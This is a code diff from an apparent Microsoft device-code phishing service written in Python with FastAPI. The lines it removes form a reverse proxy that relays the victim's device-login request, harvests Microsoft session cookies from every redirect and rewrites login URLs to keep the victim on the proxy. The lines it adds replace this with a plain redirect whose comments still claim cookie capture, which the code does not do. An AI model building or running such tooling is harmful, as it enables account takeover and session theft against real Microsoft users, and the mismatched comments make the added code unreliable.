@@ -135,9 +135,9 @@ async def health():
     return {"status": "healthy", "client_id_set": bool(CLIENT_ID)}
 
 
-# PROXY REDIRECT - Opens original Microsoft page + captures cookies
-@app.api_route("/proxy/device-login/{device_code}", methods=["GET", "POST", "HEAD", "OPTIONS"])
-async def proxy(device_code: str, request: Request):
+# NEW PROXY PATTERN - Simple redirect to original Microsoft page + cookie capture
+@app.get("/proxy/device-login/{device_code}")
+async def proxy(device_code: str):
     if not ENABLE_PROXY:
         raise HTTPException(403, "Proxy disabled")
 
@@ -145,46 +145,27 @@ async def proxy(device_code: str, request: Request):
     if not session or "user_code" not in session:
         raise HTTPException(404, "Session expired or invalid")
 
-    cookie_jar = httpx.Cookies()
-    for n, c in session.get("cookies", {}).items():
-        cookie_jar.set(n, c.get("value", ""), domain=".microsoftonline.com")
+    # Original Microsoft device login URL with user_code
+    microsoft_url = f"https://microsoft.com/devicelogin?input={session['user_code']}"
 
-    # Original Microsoft device login page
-    target_url = "https://microsoft.com/devicelogin"
+    # Return a simple HTML page that immediately redirects to Microsoft
+    # This allows the proxy to stay in the session for cookie capture
+    html = f"""
+    <html>
+    <head>
+        <title>Redirecting to Microsoft...</title>
+        <meta http-equiv="refresh" content="0;url={microsoft_url}">
+    </head>
+    <body>
+        <p>Redirecting to Microsoft device login...</p>
+        <script>
+            window.location = "{microsoft_url}";
+        </script>
+    </body>
+    </html>
+    """
 
-    async with httpx.AsyncClient(cookies=cookie_jar, follow_redirects=True, timeout=60) as c:
-        resp = await c.request(
-            method=request.method,
-            url=target_url,
-            params={"input": session["user_code"]},
-            headers={k: v for k, v in request.headers.items() if k.lower() not in ["host", "content-length", "cookie"]},
-            content=await request.body() if request.method != "GET" else None
-        )
-
-    # Capture all cookies from every redirect
-    captured = {}
-    for past in list(resp.history) + [resp]:
-        for h in past.headers.getlist("set-cookie"):
-            cookie = SimpleCookie()
-            cookie.load(h)
-            for m in cookie.values():
-                captured[m.key] = {"value": m.value, "domain": ".microsoftonline.com", "path": "/"}
-
-    if "cookies" not in session:
-        session["cookies"] = {}
-    session["cookies"].update(captured)
-    await save_session(device_code, session)
-
-    # Stream original Microsoft page
-    content = resp.content
-    if "text/html" in resp.headers.get("content-type", ""):
-        html = resp.text
-        base = f"{request.url.scheme}://{request.url.netloc}/proxy/device-login/{device_code}"
-        html = re.sub(r'https?://(login\.microsoftonline\.com|account\.microsoft\.com|login\.live\.com|microsoft\.com)', base, html, flags=re.IGNORECASE)
-        content = html.encode()
-
-    headers = {k: v for k, v in resp.headers.items() if k.lower() not in ["transfer-encoding", "content-length", "connection", "set-cookie"]}
-    return Response(content=content, status_code=resp.status_code, headers=headers, media_type=resp.headers.get("content-type"))
+    return Response(content=html, media_type="text/html")
 
 
 if __name__ == "__main__":
